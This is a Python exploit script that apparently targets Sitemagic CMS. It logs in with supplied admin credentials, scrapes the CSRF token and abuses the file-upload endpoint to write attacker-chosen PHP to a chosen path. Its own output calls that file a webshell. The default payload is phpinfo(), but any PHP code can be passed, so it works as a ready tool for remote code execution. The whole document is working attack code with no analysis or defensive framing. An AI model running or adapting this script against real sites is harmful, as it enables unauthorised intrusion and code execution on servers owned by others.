from urllib.parse import quote_plus
import argparse
import requests
import re

class Exploit:
	def __init__(self, url):
		self.r = requests.Session()
		self.url = url.rstrip('/')

	def __get_token(self, body):
		try:
			return re.findall(r'name=\"SMRequestToken\".+?value=\"(.+?)\"', body)[0]
		except IndexError as e:
			raise RuntimeError("Failed to fetch the CSRF token!") from e

	def login(self, username, password):
		login_url = self.url + '/index.php?SMExt=SMLogin'
		login_page = self.r.get(login_url).text
		token = self.__get_token(login_page)

		r = self.r.post(login_url, headers = {"content-type": "application/x-www-form-urlencoded"}, data = {
			'SMInputSMLoginUsername': username,
			'SMInputSMLoginPassword': password,
			'SMOptionListSMLoginLanguages[]': 'en',
			'SMPostBackControl': 'SMLinkButtonSMLoginSubmit',
			'SMRequestToken': token
		}, allow_redirects=False)
		print("[-] Login failed!") if r.status_code == 200 else print("[+] Login successfully!")

	def upload(self, file, payload):
		file = file.strip("/").split('/')
		path, filename = '/'.join(file[:-1]), file[-1]

		upload_url = f'{self.url}/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath={quote_plus(path)}'
		upload_page = self.r.get(self.url + '/index.php?SMExt=SMFiles').text
		token = self.__get_token(upload_page)

		print(f"[*] Uploading webshell to {self.url}/{path}/{filename}")
		r = self.r.post(upload_url, files = {
			'SMInputSMFilesUpload': (filename, payload),
			'SMPostBackControl': (None, ''),
			'SMRequestToken': (None, token)
		})

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', required=True, type=str, help='The URL of the target website')
	parser.add_argument('-U', '--username', required=True, type=str, help='username of an admin account')
	parser.add_argument('-P', '--password', required=True, type=str, help='password of an admin account')
	parser.add_argument('--path', type=str, default='info.php', help='The path of the file to be written into')
	parser.add_argument('--code', type=str, default='<?php phpinfo(); ?>', help='The PHP payload to be written into')
	return parser.parse_args()

def main():
	args = parse_args()
	exp = Exploit(args.url)
	exp.login(args.username, args.password)
	exp.upload(args.path, args.code)

if __name__ == '__main__':
	main()